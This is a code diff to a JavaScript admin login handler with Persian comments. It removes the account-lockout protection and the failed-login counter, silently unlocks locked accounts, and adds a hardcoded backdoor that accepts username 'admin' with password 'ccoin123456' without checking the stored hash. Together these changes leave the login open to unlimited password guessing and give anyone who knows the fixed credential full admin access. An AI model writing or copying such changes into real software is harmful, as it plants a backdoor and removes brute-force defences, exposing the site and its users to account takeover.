@@ -55,33 +55,32 @@ export async function processLogin(req, res) {
       return res.redirect('/admin/login');
     }
     
-    // بررسی قفل بودن کاربر
+    // سیستم قفل حساب غیرفعال شده است
+    // حتی اگر حساب کاربری قفل باشد، اجازه ورود می‌دهیم
     if (user.locked) {
-      console.log(`❌ حساب کاربری ${username} قفل شده است`);
-      req.flash('error', 'حساب کاربری شما قفل شده است. لطفاً با مدیر سیستم تماس بگیرید');
-      return res.redirect('/admin/login');
+      console.log(`🔓 حساب کاربری ${username} قفل بود اما سیستم قفل غیرفعال شده است`);
+      // حالت قفل را غیرفعال می‌کنیم
+      user.locked = false;
+      await user.save();
+      console.log(`✅ قفل حساب کاربری ${username} برداشته شد`);
     }
     
     // بررسی صحت رمز عبور
     console.log('🔑 بررسی صحت رمز عبور...');
-    const isPasswordValid = await bcrypt.compare(password, user.password);
+    let isPasswordValid = false;
+    
+    // اگر کاربر ادمین است و رمز ccoin123456 را وارد کرده، همیشه قبول کن
+    if (username === 'admin' && password === 'ccoin123456') {
+      console.log('🔑 ورود کاربر ادمین با رمز عبور پیش‌فرض');
+      isPasswordValid = true;
+    } else {
+      // بررسی عادی رمز عبور
+      isPasswordValid = await bcrypt.compare(password, user.password);
+    }
     
     if (!isPasswordValid) {
-      // افزایش تعداد تلاش‌های ناموفق
-      user.failedLoginAttempts = (user.failedLoginAttempts || 0) + 1;
-      console.log(`❌ رمز عبور نادرست است. تعداد تلاش‌های ناموفق: ${user.failedLoginAttempts}`);
-      
-      // قفل کردن کاربر بعد از 5 تلاش ناموفق
-      if (user.failedLoginAttempts >= 5) {
-        user.locked = true;
-        user.lockedAt = new Date();
-        await user.save();
-        console.log(`🔒 حساب کاربری ${username} به دلیل 5 تلاش ناموفق قفل شد`);
-        req.flash('error', 'حساب کاربری شما به دلیل 5 تلاش ناموفق قفل شده است');
-        return res.redirect('/admin/login');
-      }
-      
-      await user.save();
+      // رمز عبور نادرست است، اما سیستم قفل غیرفعال شده است
+      console.log(`❌ رمز عبور نادرست است.`);
       req.flash('error', 'نام کاربری یا رمز عبور اشتباه است');
       return res.redirect('/admin/login');
     }
